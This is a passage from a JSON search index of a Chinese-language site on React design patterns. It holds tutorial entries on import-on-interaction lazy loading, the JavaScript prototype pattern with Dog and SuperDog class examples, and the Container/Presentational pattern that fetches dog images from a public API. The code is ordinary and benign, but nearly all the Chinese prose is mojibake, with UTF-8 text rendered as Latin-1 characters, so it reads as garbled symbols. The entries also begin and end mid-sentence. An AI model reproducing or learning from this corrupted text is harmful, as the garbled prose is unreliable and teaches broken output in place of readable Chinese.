è¿™æ„å‘³ç€é¡µé¢ä¸Šè®¸å¤šåŠŸèƒ½çš„ä»£ç æ°¸è¿œä¸ä¼šå‘é€åˆ°æµè§ˆå™¨ï¼Œå› ä¸ºç”¨æˆ·ä¸éœ€è¦ä½¿ç”¨å®ƒä»¬ã€‚\n  å¦‚ä½•é¿å…ä¸¢å¤±æ—©æœŸç‚¹å‡»ï¼Ÿ\nåœ¨è¿™äº› Google å›¢é˜Ÿä½¿ç”¨çš„æ¡†æ¶å †æ ˆä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åŠæ—©è·Ÿè¸ªç‚¹å‡»æ¬¡æ•°ï¼Œå› ä¸º HTML çš„ç¬¬ä¸€å—åŒ…å«ä¸€ä¸ªå°å‹äº‹ä»¶åº“ (JSAction)ï¼Œå®ƒåœ¨æ¡†æ¶å¯åŠ¨ä¹‹å‰è·Ÿè¸ªæ‰€æœ‰ç‚¹å‡»æ¬¡æ•°ã€‚\nè¿™äº›äº‹ä»¶ç”¨äºä¸¤ä»¶äº‹ï¼š\n  åŸºäºç”¨æˆ·äº¤äº’è§¦å‘ç»„ä»¶ä»£ç ä¸‹è½½\n  å½“æ¡†æ¶å®Œæˆå¼•å¯¼æ—¶é‡æ”¾ç”¨æˆ·äº¤äº’\n  å¯ä»¥ä½¿ç”¨çš„å…¶ä»–æ½œåœ¨å¯å‘å¼æ–¹æ³•åŒ…æ‹¬åŠ è½½ç»„ä»¶ä»£ç ï¼š\n  ç©ºé—²æ—¶é—´åçš„ä¸€æ®µæ—¶é—´\n  ç”¨æˆ·å°†é¼ æ ‡æ‚¬åœåœ¨ç›¸å…³çš„ UI/æŒ‰é’®/å·å¬æ€§ç”¨è¯­ä¸Š\n  åŸºäºåŸºäºæµè§ˆå™¨ä¿¡å·ï¼ˆä¾‹å¦‚ç½‘ç»œé€Ÿåº¦ã€æ•°æ®ä¿æŠ¤æ¨¡å¼ç­‰ï¼‰çš„çƒ­åˆ‡ç¨‹åº¦\n  æ•°æ®å‘¢ï¼Ÿ\nç”¨äºå‘ˆç°é¡µé¢çš„åˆå§‹æ•°æ®åŒ…å«åœ¨åˆå§‹é¡µé¢çš„ SSR HTML ä¸­å¹¶è¿›è¡Œæµå¼ä¼ è¾“ã€‚ å»¶è¿ŸåŠ è½½çš„æ•°æ®æ˜¯æ ¹æ®ç”¨æˆ·äº¤äº’ä¸‹è½½çš„ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“å®ƒä¸å“ªä¸ªç»„ä»¶ä¸€èµ·ä½¿ç”¨ã€‚\nè¿™å®Œæˆäº†äº¤äº’å¯¼å…¥å›¾ç‰‡ï¼Œæ•°æ®è·å–å·¥ä½œç±»ä¼¼äº CSS å’Œ JS çš„åŠŸèƒ½ã€‚ ç”±äºç»„ä»¶çŸ¥é“å®ƒéœ€è¦ä»€ä¹ˆä»£ç å’Œæ•°æ®ï¼Œå› æ­¤å®ƒçš„æ‰€æœ‰èµ„æºæ°¸è¿œä¸ä¼šè¶…è¿‡ä¸€ä¸ªè¯·æ±‚ã€‚\nè¿™åœ¨æ„å»ºæœŸé—´åˆ›å»ºç»„ä»¶åŠå…¶ä¾èµ–å…³ç³»å›¾æ—¶èµ·ä½œç”¨ã€‚ Web åº”ç”¨ç¨‹åºèƒ½å¤Ÿåœ¨ä»»ä½•æ—¶å€™å¼•ç”¨æ­¤å›¾å¹¶å¿«é€Ÿè·å–ä»»ä½•ç»„ä»¶æ‰€éœ€çš„èµ„æºï¼ˆä»£ç å’Œæ•°æ®ï¼‰ã€‚ è¿™ä¹Ÿæ„å‘³ç€æˆ‘ä»¬åŸºäºç»„ä»¶è€Œä¸æ˜¯è·¯ç”±è¿›è¡Œä»£ç æ‹†åˆ†ã€‚\næœ‰å…³ä¸Šè¿°ç¤ºä¾‹çš„æ¼”ç»ƒï¼Œè¯·å‚é˜…é€šè¿‡ JavaScript ç¤¾åŒºæå‡ Web å¹³å°ã€‚\n\ræƒè¡¡ å°†æ˜‚è´µçš„å·¥ä½œè½¬ç§»åˆ°æ›´æ¥è¿‘ç”¨æˆ·äº¤äº’çš„ä½ç½®å¯ä»¥ä¼˜åŒ–é¡µé¢æœ€åˆåŠ è½½çš„é€Ÿåº¦ï¼Œä½†æ˜¯è¯¥æŠ€æœ¯å¹¶éæ²¡æœ‰æŠ˜è¡·ã€‚\nå¦‚æœç”¨æˆ·ç‚¹å‡»ååŠ è½½è„šæœ¬éœ€è¦å¾ˆé•¿æ—¶é—´ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ\nåœ¨ Google Hotels ç¤ºä¾‹ä¸­ï¼Œå°ç²’åº¦å—æœ€å¤§é™åº¦åœ°å‡å°‘äº†ç”¨æˆ·ç­‰å¾…ä»£ç å’Œæ•°æ®è·å–å’Œæ‰§è¡Œæ—¶é—´è¿‡é•¿çš„æœºä¼šã€‚ åœ¨å…¶ä»–ä¸€äº›æƒ…å†µä¸‹ï¼Œè¾ƒå¤§çš„ä¾èµ–æ€§å¯èƒ½ç¡®å®ä¼šåœ¨è¾ƒæ…¢çš„ç½‘ç»œä¸Šå¼•å…¥è¿™ç§æ‹…å¿§ã€‚\nå‡å°‘è¿™ç§æƒ…å†µå‘ç”Ÿçš„ä¸€ç§æ–¹æ³•æ˜¯åœ¨é¡µé¢ä¸­çš„å…³é”®å†…å®¹åŠ è½½å®Œæˆåæ›´å¥½åœ°ä¸­æ–­åŠ è½½æˆ–é¢„å–è¿™äº›èµ„æºã€‚ é¼“åŠ±è¡¡é‡è¿™ç§å½±å“ï¼Œä»¥ç¡®å®šå®ƒåœ¨æ‚¨çš„åº”ç”¨ç¨‹åºä¸­çš„çœŸå®åº”ç”¨ç¨‹åºã€‚\nåœ¨ç”¨æˆ·äº¤äº’ä¹‹å‰ç¼ºä¹åŠŸèƒ½æ€ä¹ˆåŠï¼Ÿ\nå¤–è§‚çš„å¦ä¸€ä¸ªæƒè¡¡æ˜¯åœ¨ç”¨æˆ·äº¤äº’ä¹‹å‰ç¼ºä¹åŠŸèƒ½ã€‚ ä¾‹å¦‚ï¼ŒåµŒå…¥å¼è§†é¢‘æ’­æ”¾å™¨å°†æ— æ³•è‡ªåŠ¨æ’­æ”¾åª’ä½“ã€‚ å¦‚æœæ­¤ç±»åŠŸèƒ½å¾ˆé‡è¦ï¼Œæ‚¨å¯èƒ½ä¼šè€ƒè™‘åŠ è½½èµ„æºçš„æ›¿ä»£æ–¹æ³•ï¼Œä¾‹å¦‚åœ¨ç”¨æˆ·ä¸Šå»¶è¿ŸåŠ è½½è¿™äº›ç¬¬ä¸‰æ–¹ iframeï¼Œå°†å®ƒä»¬æ»šåŠ¨åˆ°è§†å›¾ä¸­ï¼Œè€Œä¸æ˜¯å°†åŠ è½½æ¨è¿Ÿåˆ°äº¤äº’ã€‚\n\rç”¨é™æ€å˜ä½“æ›¿æ¢äº¤äº’å¼åµŒå…¥ æˆ‘ä»¬å·²ç»è®¨è®ºäº†äº¤äº’å¯¼å…¥æ¨¡å¼å’Œæ¸è¿›å¼åŠ è½½ï¼Œä½†æ˜¯å¯¹äºåµŒå…¥ç”¨ä¾‹å®Œå…¨é™æ€å¦‚ä½•ï¼Ÿ\nåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šç«‹å³éœ€è¦æ¥è‡ªåµŒå…¥çš„æœ€ç»ˆæ¸²æŸ“å†…å®¹ï¼Œä¾‹å¦‚åœ¨åˆå§‹è§†å£ä¸­å¯è§çš„ç¤¾äº¤åª’ä½“å¸–å­ã€‚\nå½“åµŒå…¥å¸¦æ¥ 2-3MB çš„ JavaScript æ—¶ï¼Œè¿™ä¹Ÿä¼šå¸¦æ¥å®ƒè‡ªå·±çš„æŒ‘æˆ˜ã€‚ ç”±äºéœ€è¦ç«‹å³åµŒå…¥å†…å®¹ï¼Œå› æ­¤å»¶è¿ŸåŠ è½½å’Œå¤–è§‚å¯èƒ½ä¸å¤ªé€‚ç”¨ã€‚\nå¦‚æœä¼˜åŒ–æ€§èƒ½ï¼Œåˆ™å¯ä»¥ä½¿ç”¨çœ‹èµ·æ¥ç›¸ä¼¼çš„é™æ€å˜ä½“å®Œå…¨æ›¿æ¢åµŒå…¥ï¼Œé“¾æ¥åˆ°æ›´å…·äº¤äº’æ€§çš„ç‰ˆæœ¬ï¼ˆä¾‹å¦‚åŸå§‹ç¤¾äº¤åª’ä½“å¸–å­ï¼‰ã€‚ åœ¨æ„å»ºæ—¶ï¼ŒåµŒå…¥çš„æ•°æ®å¯ä»¥è¢«æ‹‰å…¥å¹¶è½¬æ¢ä¸ºé™æ€ HTML ç‰ˆæœ¬ã€‚\nè¿™æ˜¯@wongmjane åœ¨ä»–ä»¬çš„åšå®¢ä¸Šä¸ºä¸€ç§ç¤¾äº¤åª’ä½“åµŒå…¥æ‰€é‡‡ç”¨çš„æ–¹æ³•ï¼Œæ—¢æé«˜äº†é¡µé¢åŠ è½½æ€§èƒ½ï¼Œåˆæ¶ˆé™¤äº†ç”±äºåµŒå…¥ä»£ç å¢å¼ºäº†åå¤‡æ–‡æœ¬è€Œå¯¼è‡´å¸ƒå±€åç§»è€Œå¯¼è‡´çš„ç´¯ç§¯å¸ƒå±€åç§»ã€‚\nè™½ç„¶é™æ€æ›¿æ¢å¯¹æ€§èƒ½æœ‰å¥½å¤„ï¼Œä½†å®ƒä»¬é€šå¸¸éœ€è¦åšä¸€äº›è‡ªå®šä¹‰çš„äº‹æƒ…ï¼Œå› æ­¤åœ¨è¯„ä¼°æ‚¨çš„é€‰é¡¹æ—¶è¯·è®°ä½è¿™ä¸€ç‚¹ã€‚\n\rç»“è®º ç¬¬ä¸€éƒ¨åˆ† JavaScript é€šå¸¸ä¼šå½±å“ Web ä¸Šç°ä»£é¡µé¢çš„äº¤äº’å‡†å¤‡æƒ…å†µï¼Œä½†å®ƒé€šå¸¸ä¼šåœ¨æ¥è‡ªä¿æŒä¸»çº¿ç¨‹å¿™ç¢Œçš„ç¬¬ä¸€æ–¹æˆ–ç¬¬ä¸‰æ–¹æºçš„éå…³é”® JS åé¢çš„ç½‘ç»œä¸Šå»¶è¿Ÿã€‚\nä¸€èˆ¬æƒ…å†µä¸‹ï¼Œé¿å…åœ¨æ–‡æ¡£å¤´éƒ¨åŒæ­¥ç¬¬ä¸‰æ–¹è„šæœ¬ï¼Œç›®çš„æ˜¯åœ¨ç¬¬ä¸€æ–¹ JS åŠ è½½å®ŒæˆååŠ è½½éé˜»å¡çš„ç¬¬ä¸‰æ–¹è„šæœ¬ã€‚ äº¤äº’æ—¶å¯¼å…¥ç­‰æ¨¡å¼ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç§æ–¹æ³•ï¼Œå¯ä»¥å°†éå…³é”®èµ„æºçš„åŠ è½½æ¨è¿Ÿåˆ°ç”¨æˆ·æ›´æœ‰å¯èƒ½éœ€è¦ä»–ä»¬æ”¯æŒçš„ UI æ—¶ã€‚\n\rçŸ¥è¯†ç‚¹   preview\n  React.lazy\n  Suspense\n  ","description":"å½“ç”¨æˆ·ä¸éœ€è¦ä¸ UI äº¤äº’æ—¶åŠ è½½éå…³é”®èµ„æº","id":89,"section":"react-patterns","tags":null,"title":"äº¤äº’å¯¼å…¥","uri":"https://codthing.github.io/react-patterns/performance-patterns/import-on-interaction/"},{"content":"åŸå‹æ¨¡å¼æ˜¯ä¸€ç§åœ¨è®¸å¤šç›¸åŒç±»å‹çš„å¯¹è±¡ä¹‹é—´å…±äº«å±æ€§çš„æœ‰ç”¨æ–¹æ³•ã€‚ åŸå‹prototypeæ˜¯ JavaScript åŸç”Ÿçš„å¯¹è±¡ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡åŸå‹é“¾__proto__è®¿é—®ã€‚\nåœ¨åº”ç”¨ç¨‹åºä¸­ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦åˆ›å»ºè®¸å¤šç›¸åŒç±»å‹çš„å¯¹è±¡ã€‚ ä¸€ä¸ªæœ‰ç”¨çš„æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ª ES6 ç±»çš„å¤šä¸ªå®ä¾‹ã€‚\nå‡è®¾æˆ‘ä»¬æƒ³åˆ›é€ å¾ˆå¤šç‹—ï¼ åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œç‹—ä¸èƒ½åšå¾ˆå¤šäº‹ï¼šå®ƒä»¬åªæœ‰ä¸€ä¸ªåå­—ï¼Œè€Œä¸”å®ƒä»¬å¯ä»¥å å«ï¼\n\rç±» class 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  class Dog { constructor(name) { this.name = name; } bark() { return `Woof!`; } } const dog1 = new Dog(\u0026#34;Daisy\u0026#34;); const dog2 = new Dog(\u0026#34;Max\u0026#34;); const dog3 = new Dog(\u0026#34;Spot\u0026#34;); console.log(dog1.name); //Daisy console.log(dog2.name); //Max console.log(dog3.name); //Spot   \råŸå‹ prototype è¯·æ³¨æ„ï¼Œæ„é€ å‡½æ•°å¦‚ä½•åŒ…å« name å±æ€§ï¼Œè€Œç±»æœ¬èº«åŒ…å« bark å±æ€§ã€‚ ä½¿ç”¨ ES6 ç±»æ—¶ï¼Œåœ¨ç±»æœ¬èº«ä¸Šå®šä¹‰çš„æ‰€æœ‰å±æ€§ï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸º barkï¼‰éƒ½ä¼šè‡ªåŠ¨æ·»åŠ åˆ°åŸå‹prototypeä¸­ã€‚\nå¯ä»¥é€šè¿‡è®¿é—®æ„é€ å‡½æ•°ä¸Šçš„ prototype å±æ€§ç›´æ¥æŸ¥çœ‹åŸå‹ï¼Œæˆ–è€…é€šè¿‡ä»»ä½•å®ä¾‹ä¸Šçš„ __proto__ å±æ€§ã€‚\n1 2 3 4 5 6  console.log(Dog.prototype); // constructor: Æ’ Dog(name, breed) bark: Æ’ bark()  console.log(dog1.__proto__); // constructor: Æ’ Dog(name, breed) bark: Æ’ bark()   __proto__ åœ¨æ„é€ å‡½æ•°çš„ä»»ä½•å®ä¾‹ä¸Šçš„å€¼ï¼Œæ˜¯å¯¹æ„é€ å‡½æ•°åŸå‹çš„ç›´æ¥å¼•ç”¨ï¼ æ¯å½“æˆ‘ä»¬å°è¯•ç›´æ¥è®¿é—®å¯¹è±¡ä¸Šä¸å­˜åœ¨çš„å±æ€§æ—¶ï¼ŒJavaScript å°†æ²¿ç€åŸå‹é“¾å‘ä¸‹æŸ¥çœ‹è¯¥å±æ€§æ˜¯å¦åœ¨åŸå‹é“¾ä¸­å¯ç”¨ã€‚\nåœ¨å¤„ç†åº”è¯¥å¯ä»¥è®¿é—®ç›¸åŒå±æ€§çš„å¯¹è±¡æ—¶ï¼ŒåŸå‹æ¨¡å¼éå¸¸å¼ºå¤§ã€‚ å¯ä»¥ç®€å•åœ°å°†å±æ€§æ·»åŠ åˆ°åŸå‹ï¼Œè€Œä¸æ˜¯æ¯æ¬¡éƒ½åˆ›å»ºå±æ€§çš„å‰¯æœ¬ï¼Œå› ä¸ºæ‰€æœ‰å®ä¾‹éƒ½å¯ä»¥è®¿é—®åŸå‹å¯¹è±¡ã€‚\nç”±äºæ‰€æœ‰å®ä¾‹éƒ½å¯ä»¥è®¿é—®åŸå‹ï¼Œå› æ­¤å³ä½¿åœ¨åˆ›å»ºå®ä¾‹ä¹‹åï¼Œä¹Ÿå¯ä»¥è½»æ¾åœ°å‘åŸå‹æ·»åŠ å±æ€§ã€‚\nç‹—ä¸ä»…åº”è¯¥ä¼šå ï¼Œè¿˜åº”è¯¥ä¼šç©ï¼å¯ä»¥é€šè¿‡å‘åŸå‹æ·»åŠ  play å±æ€§æ¥å®ç°è¿™ä¸€ç‚¹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  class Dog { constructor(name) { this.name = name; } bark() { return `Woof!`; } } const dog1 = new Dog(\u0026#34;Daisy\u0026#34;); const dog2 = new Dog(\u0026#34;Max\u0026#34;); const dog3 = new Dog(\u0026#34;Spot\u0026#34;); Dog.prototype.play = () =\u0026gt; console.log(\u0026#34;Playing now!\u0026#34;); dog1.play(); //Playing now!   \råŸå‹é“¾ __proto__ åŸå‹é“¾è¡¨ç¤ºå¯èƒ½ä¸æ­¢ä¸€ä¸ªæ­¥éª¤ã€‚ çš„ç¡®ï¼ åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬åªçœ‹åˆ°äº†å¦‚ä½•è®¿é—®åœ¨ __proto__ å¼•ç”¨çš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä¸Šç›´æ¥å¯ç”¨çš„å±æ€§ã€‚ ç„¶è€Œï¼ŒåŸå‹æœ¬èº«ä¹Ÿæœ‰ä¸€ä¸ª __proto__ å¯¹è±¡ï¼\nè®©æˆ‘ä»¬åˆ›é€ å¦ä¸€ç§ç±»å‹çš„ç‹—ï¼Œè¶…çº§ç‹—ï¼ è¿™åªç‹—åº”è¯¥ç»§æ‰¿æ™®é€šç‹—çš„ä¸€åˆ‡ï¼Œä½†å®ƒä¹Ÿåº”è¯¥ä¼šé£ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰©å±• Dog ç±»å¹¶æ·»åŠ  fly æ–¹æ³•æ¥åˆ›å»ºè¶…çº§ç‹—ã€‚\nclass SuperDog extends Dog {\rconstructor(name) {\rsuper(name);\r}\rfly() {\rreturn \u0026#34;Flying!\u0026#34;;\r}\r} è®©æˆ‘ä»¬åˆ›é€ ä¸€åªåå«â€œDaisyâ€çš„é£ç‹—ï¼Œè®©å¥¹å å«é£ç¿”ï¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  class Dog { constructor(name) { this.name = name; } bark() { console.log(\u0026#34;Woof!\u0026#34;); } } class SuperDog extends Dog { constructor(name) { super(name); } fly() { console.log(`Flying!`); } } const dog1 = new SuperDog(\u0026#34;Daisy\u0026#34;); dog1.bark(); //Woof! dog1.fly(); //Flying!   æˆ‘ä»¬å¯ä»¥è®¿é—® bark æ–¹æ³•ï¼Œå› ä¸ºæˆ‘ä»¬æ‰©å±•äº† Dog ç±»ã€‚ SuperDog åŸå‹ä¸Š proto çš„å€¼æŒ‡å‘ Dog.prototype å¯¹è±¡ï¼\nå¾ˆæ¸…æ¥šä¸ºä»€ä¹ˆå®ƒè¢«ç§°ä¸ºåŸå‹é“¾ï¼šå½“æˆ‘ä»¬å°è¯•è®¿é—®å¯¹è±¡ä¸Šä¸ç›´æ¥å¯ç”¨çš„å±æ€§æ—¶ï¼ŒJavaScript ä¼šé€’å½’åœ°éå† __proto__ æŒ‡å‘çš„æ‰€æœ‰å¯¹è±¡ï¼Œç›´åˆ°æ‰¾åˆ°è¯¥å±æ€§ï¼\n\rObject.create Object.create æ–¹æ³•è®©æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶åŸå‹çš„å€¼æ˜¾å¼ä¼ é€’ç»™è¯¥å¯¹è±¡ã€‚\nconst dog = {\rbark() {\rreturn `Woof!`;\r}\r};\rconst pet1 = Object.create(dog); è™½ç„¶ pet1 æœ¬èº«æ²¡æœ‰ä»»ä½•å±æ€§ï¼Œä½†å®ƒç¡®å®å¯ä»¥è®¿é—®å…¶åŸå‹é“¾__proto__ä¸Šçš„å±æ€§ï¼ ç”±äºæˆ‘ä»¬å°† dog å¯¹è±¡ä½œä¸º pet1 çš„åŸå‹prototypeä¼ é€’ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è®¿é—® bark å±æ€§ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12  const dog = { bark() { console.log(`Woof!`); } }; const pet1 = Object.create(dog); pet1.bark(); // Woof! console.log(\u0026#34;pet1 ä¸Šçš„åŸå‹prototypeå±æ€§: \u0026#34;, Object.keys(pet1)); // pet1 ä¸Šçš„ç›´æ¥åŸå‹prototypeå±æ€§: [] console.log(\u0026#34;pet1 åŸå‹é“¾__proto__çš„å±æ€§: \u0026#34;, Object.keys(pet1.__proto__)); // pet1 åŸå‹é“¾__proto__çš„å±æ€§ï¼š[\u0026#34;bark\u0026#34;]   Perfect! Object.create æ˜¯ä¸€ç§è®©å¯¹è±¡ç›´æ¥ä»å…¶ä»–å¯¹è±¡ç»§æ‰¿å±æ€§çš„ç®€å•æ–¹æ³•ï¼Œé€šè¿‡æŒ‡å®šæ–°åˆ›å»ºçš„å¯¹è±¡çš„åŸå‹prototypeã€‚ æ–°å¯¹è±¡å¯ä»¥é€šè¿‡æ²¿ç€åŸå‹é“¾__proto__è®¿é—®æ–°å±æ€§ã€‚\n\rä¼˜ç‚¹ åŸå‹æ¨¡å¼å…è®¸æˆ‘ä»¬è½»æ¾åœ°è®©å¯¹è±¡è®¿é—®å’Œç»§æ‰¿å…¶ä»–å¯¹è±¡çš„å±æ€§ã€‚\nç”±äºåŸå‹é“¾å…è®¸æˆ‘ä»¬è®¿é—®æœªç›´æ¥å®šä¹‰åœ¨å¯¹è±¡æœ¬èº«ä¸Šçš„å±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥é¿å…æ–¹æ³•å’Œå±æ€§çš„é‡å¤ï¼Œä»è€Œå‡å°‘ä½¿ç”¨çš„å†…å­˜é‡ã€‚\n\rçŸ¥è¯†ç‚¹  prototype å¯¹è±¡/ç±»æœ¬èº«çš„å±æ€§ __proto__ åŸå‹é“¾ä¸Šçš„å±æ€§ new å°†ç±»å®ä¾‹åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ extends ç±»ç»§æ‰¿ Object.create åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡  ","description":"åœ¨è®¸å¤šç›¸åŒç±»å‹çš„å¯¹è±¡ä¹‹é—´å…±äº«å±æ€§","id":90,"section":"react-patterns","tags":null,"title":"åŸå‹æ¨¡å¼","uri":"https://codthing.github.io/react-patterns/design-patterns/prototype-pattern/"},{"content":"è¿™æ˜¯å†å²é—ç•™é—®é¢˜ï¼Œæ‰€ä»¥ä¸å»ºè®®ä½¿ç”¨ï¼ˆç°åœ¨æœ‰äº†Hooksï¼‰ï¼Œåœ¨è¿™é‡Œåªæ˜¯è®©æˆ‘ä»¬äº†è§£è¿™æ®µå†å²\nåœ¨ React ä¸­ï¼Œä¸€ç§å¼ºåˆ¶åˆ†ç¦»å…³æ³¨ç‚¹çš„æ–¹æ³•æ˜¯é€šè¿‡ä½¿ç”¨å®¹å™¨/æ¼”ç¤ºæ¨¡å¼ã€‚ä½¿ç”¨è¿™ç§æ¨¡å¼ï¼Œæˆ‘ä»¬å¯ä»¥å°†è§†å›¾ä¸åº”ç”¨ç¨‹åºé€»è¾‘åˆ†å¼€ã€‚\n\råœ¨ React ä¸­ï¼Œå¼ºåˆ¶åˆ†ç¦»å…³æ³¨ç‚¹çš„ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ Container/Presentational æ¨¡å¼ã€‚ ä½¿ç”¨è¿™ç§æ¨¡å¼ï¼Œæˆ‘ä»¬å¯ä»¥å°†è§†å›¾ä¸åº”ç”¨ç¨‹åºé€»è¾‘åˆ†å¼€ã€‚\nå‡è®¾æˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ªåº”ç”¨ç¨‹åºæ¥è·å– 6 ä¸ªç‹—çš„å›¾åƒï¼Œå¹¶å°†è¿™äº›å›¾åƒå‘ˆç°åœ¨å±å¹•ä¸Šã€‚\nç†æƒ³æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›é€šè¿‡å°†æ­¤è¿‡ç¨‹åˆ†ä¸ºä¸¤éƒ¨åˆ†æ¥å¼ºåˆ¶åˆ†ç¦»å…³æ³¨ç‚¹ï¼š\n å±•ç¤ºç»„ä»¶ï¼šå…³å¿ƒå¦‚ä½•å‘ç”¨æˆ·æ˜¾ç¤ºæ•°æ®çš„ç»„ä»¶ã€‚ åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œè¿™æ˜¯æ¸²æŸ“ç‹—å›¾åƒåˆ—è¡¨ã€‚ å®¹å™¨ç»„ä»¶ï¼šå…³å¿ƒå‘ç”¨æˆ·æ˜¾ç¤ºä»€ä¹ˆæ•°æ®çš„ç»„ä»¶ã€‚ åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œè¿™æ˜¯è·å–ç‹—çš„å›¾åƒã€‚  å®¹å™¨ç»„ä»¶ è·å–ç‹—å›¾åƒå¤„ç†åº”ç”¨ç¨‹åºé€»è¾‘ï¼Œè€Œ å±•ç¤ºç»„ä»¶ åªå¤„ç†è§†å›¾ã€‚\n\rå±•ç¤ºç»„ä»¶ ä¸€ä¸ªå±•ç¤ºç»„ä»¶é€šè¿‡ props æ¥æ”¶å®ƒçš„æ•°æ®ã€‚ å®ƒçš„ä¸»è¦åŠŸèƒ½æ˜¯ç®€å•åœ°ä»¥æˆ‘ä»¬å¸Œæœ›çš„æ–¹å¼æ˜¾ç¤ºå®ƒæ¥æ”¶åˆ°çš„æ•°æ®ï¼ŒåŒ…æ‹¬æ ·å¼ï¼Œè€Œä¸ä¿®æ”¹è¯¥æ•°æ®ã€‚\nè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹æ˜¾ç¤ºç‹—å›¾åƒçš„ç¤ºä¾‹ã€‚ åœ¨æ¸²æŸ“ç‹—å›¾åƒæ—¶ï¼Œæˆ‘ä»¬åªæƒ³æ˜ å°„ä» API è·å–çš„æ¯ä¸ªç‹—å›¾åƒï¼Œå¹¶æ¸²æŸ“è¿™äº›å›¾åƒã€‚ ä¸ºæ­¤ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªåŠŸèƒ½ç»„ä»¶ï¼Œé€šè¿‡ props æ¥æ”¶æ•°æ®ï¼Œå¹¶æ¸²æŸ“å®ƒæ¥æ”¶åˆ°çš„æ•°æ®ã€‚\n1 2 3 4 5  //å±•ç¤ºç»„ä»¶ DogImages.js export default function DogImages({ dogs }) { return dogs.map((dog, i) =\u0026gt; \u0026lt;img src={dog} key={i} alt=\u0026#34;Dog\u0026#34; /\u0026gt;); }   \rå®¹å™¨ç»„ä»¶ å®¹å™¨ç»„ä»¶çš„ä¸»è¦åŠŸèƒ½æ˜¯å°†æ•°æ®ä¼ é€’ç»™å®ƒä»¬åŒ…å«çš„è¡¨ç¤ºç»„ä»¶ã€‚ é™¤äº†å…³å¿ƒå…¶æ•°æ®çš„å±•ç¤ºç»„ä»¶ä¹‹å¤–ï¼Œå®¹å™¨ç»„ä»¶æœ¬èº«é€šå¸¸ä¸ä¼šæ¸²æŸ“ä»»ä½•å…¶ä»–ç»„ä»¶ã€‚ å› ä¸ºå®ƒä»¬è‡ªå·±ä¸æ¸²æŸ“ä»»ä½•ä¸œè¥¿ï¼Œæ‰€ä»¥å®ƒä»¬é€šå¸¸ä¹Ÿä¸åŒ…å«ä»»ä½•æ ·å¼ã€‚\nåœ¨ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å¸Œæœ›å°†ç‹—å›¾åƒä¼ é€’ç»™ DogsImages å±•ç¤ºç»„ä»¶ã€‚ åœ¨èƒ½å¤Ÿè¿™æ ·åšä¹‹å‰ï¼Œéœ€è¦ä»å¤–éƒ¨ API è·å–å›¾åƒã€‚\néœ€è¦åˆ›å»ºä¸€ä¸ªå®¹å™¨ç»„ä»¶æ¥è·å–è¿™äº›æ•°æ®ï¼Œå¹¶å°†è¿™äº›æ•°æ®ä¼ é€’ç»™å±•ç¤ºç»„ä»¶ DogImages ä»¥ä¾¿åœ¨å±å¹•ä¸Šæ˜¾ç¤ºå®ƒã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  //å®¹å™¨ç»„ä»¶ DogImagesContainer.js import React from \u0026#34;react\u0026#34;; import DogImages from \u0026#34;./DogImages\u0026#34;; export default class DogImagesContainer extends React.Component { constructor() { super(); this.state = { dogs: [] }; } componentDidMount() { fetch(\u0026#34;https://dog.ceo/api/breed/labrador/images/random/6\u0026#34;) .then(res =\u0026gt; res.json()) .then(({ message }) =\u0026gt; this.setState({ dogs: message })); } render() { return \u0026lt;DogImages dogs={this.state.dogs} /\u0026gt;; } }   \rå°†ç»„ä»¶æ¸²æŸ“åˆ°é¡µé¢ä¸­ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  //å°†ç»„ä»¶æ¸²æŸ“åˆ°é¡µé¢ä¸­ import React from \u0026#34;react\u0026#34;; import { render } from \u0026#34;react-dom\u0026#34;; import DogImagesContainer from \u0026#34;./DogImagesContainer\u0026#34;; import \u0026#34;./styles.css\u0026#34;; function App() { return ( \u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt; \u0026lt;h1\u0026gt; Browse Dog Images{\u0026#34; \u0026#34;} \u0026lt;span role=\u0026#34;img\u0026#34; aria-label=\u0026#34;emoji\u0026#34;\u0026gt; ğŸ• \u0026lt;/span\u0026gt; \u0026lt;/h1\u0026gt; \u0026lt;DogImagesContainer /\u0026gt; \u0026lt;/div\u0026gt; ); } render(\u0026lt;App /\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;));   \rHooks åœ¨å¾ˆå¤šæƒ…å†µä¸‹ï¼ŒContainer/Presentational æ¨¡å¼å¯ä»¥ç”¨ React Hooks ä»£æ›¿ã€‚ Hooks çš„å¼•å…¥ä½¿å¼€å‘äººå‘˜å¯ä»¥è½»æ¾æ·»åŠ çŠ¶æ€ï¼Œè€Œæ— 